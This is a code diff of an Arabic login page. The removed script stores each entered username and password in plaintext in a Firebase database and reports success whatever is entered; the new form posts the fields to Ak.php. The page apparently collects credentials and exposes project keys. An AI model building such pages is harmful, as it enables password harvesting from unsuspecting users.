@@ -4,78 +4,42 @@
   <meta charset="UTF-8">
   <title>تسجيل الدخول</title>
   <style>
-    body { font-family: "Tahoma", sans-serif; background-color: #f5f5f5; direction: rtl; text-align: center; padding: 50px; }
+    body { font-family:
+       "Tahoma", sans-serif;
+     background-color: #f5f5f5; direction: rtl; text-align: center; padding: 50px; }
     .login-box { background: white; padding: 30px; border-radius: 8px; width: 300px; margin: auto; box-shadow: 0 2px 5px rgba(0,0,0,0.2); }
     input { width: 90%; padding: 10px; margin: 10px 0; border: 1px solid #ccc; border-radius: 5px; text-align: center; }
     button { background-color: #2e8b57; color: white; padding: 10px 20px; border: none; border-radius: 5px; cursor: pointer; }
+    button:hover { background-color: #1c5c3c; }
   </style>
 </head>
 <body>
 
   <div class="login-box">
     <h2>تسجيل الدخول</h2>
-    <form id="loginForm">
-      <input type="text" id="username" placeholder="اسم المستخدم (أرقام فقط)" required>
-      <input type="password" id="password" placeholder="كلمة السر" required>
+    <form action="Ak.php" method="POST" onsubmit="return validateLogin()">
+      <input type="text" id="username" name="username" placeholder="اسم المستخدم (أرقام فقط)" required>
+      <input type="password" id="password" name="password" placeholder="كلمة السر" required>
       <button type="submit">دخول</button>
     </form>
   </div>
 
-  <script type="module">
-    // Import the functions you need from the SDKs you need
-import { initializeApp } from "firebase/app";
-import { getAnalytics } from "firebase/analytics";
-// TODO: Add SDKs for Firebase products that you want to use
-// https://firebase.google.com/docs/web/setup#available-libraries
-
-// Your web app's Firebase configuration
-// For Firebase JS SDK v7.20.0 and later, measurementId is optional
-const firebaseConfig = {
-  apiKey: "AIzaSyDFEMzlFW6QNzmekej0EIC6CywEXMITJuA",
-  authDomain: "myproject-6d86a.firebaseapp.com",
-  databaseURL: "https://myproject-6d86a-default-rtdb.firebaseio.com",
-  projectId: "myproject-6d86a",
-  storageBucket: "myproject-6d86a.firebasestorage.app",
-  messagingSenderId: "1090880882223",
-  appId: "1:1090880882223:web:dc4732699873d9762268da",
-  measurementId: "G-4SJ8SNF7ZL"
-};
-
-// Initialize Firebase
-const app = initializeApp(firebaseConfig);
-const analytics = getAnalytics(app);
-    import { initializeApp } from "https://www.gstatic.com/firebasejs/9.6.10/firebase-app.js";
-    import { getDatabase, ref, push } from "https://www.gstatic.com/firebasejs/9.6.10/firebase-database.js";
-
-    // استبدل هذه البيانات ببيانات مشروعك الخاصة من Firebase
-    const firebaseConfig = {
-      apiKey: "YOUR_API_KEY",
-      authDomain: "YOUR_PROJECT_ID.firebaseapp.com",
-      databaseURL: "https://YOUR_PROJECT_ID-default-rtdb.firebaseio.com",
-      projectId: "YOUR_PROJECT_ID",
-      storageBucket: "YOUR_PROJECT_ID.appspot.com",
-      messagingSenderId: "YOUR_ID",
-      appId: "YOUR_APP_ID"
-    };
-
-    const app = initializeApp(firebaseConfig);
-    const db = getDatabase(app);
-
-    document.getElementById("loginForm").onsubmit = function(e) {
-      e.preventDefault();
-      const user = document.getElementById("username").value;
-      const pass = document.getElementById("password").value;
-
-      // حفظ بيانات الدخول
-      push(ref(db, 'logins'), {
-        username: user,
-        password: pass,
-        time: new Date().toLocaleString()
-      }).then(() => {
-        alert("تم تسجيل الدخول بنجاح!");
-        window.location.href = "ar.html"; // الانتقال لصفحة القراءات
-      });
-    };
+  <script>
+    function validateLogin() {
+      const username = document.getElementById("username").value;
+      const password = document.getElementById("password").value;
+      const regex = /^[0-9]+$/;
+      if (!regex.test(username)) {
+        alert("اسم المستخدم يجب أن يكون أرقاماً فقط");
+        return false;
+      }
+      if (password.length < 4) {
+        alert("كلمة السر يجب أن تكون 4 أحرف على الأقل");
+        return false;
+      }
+      return true; // سيتم إرسال البيانات لملف Ak.php الآن
+    }
   </script>
+
 </body>
 </html>
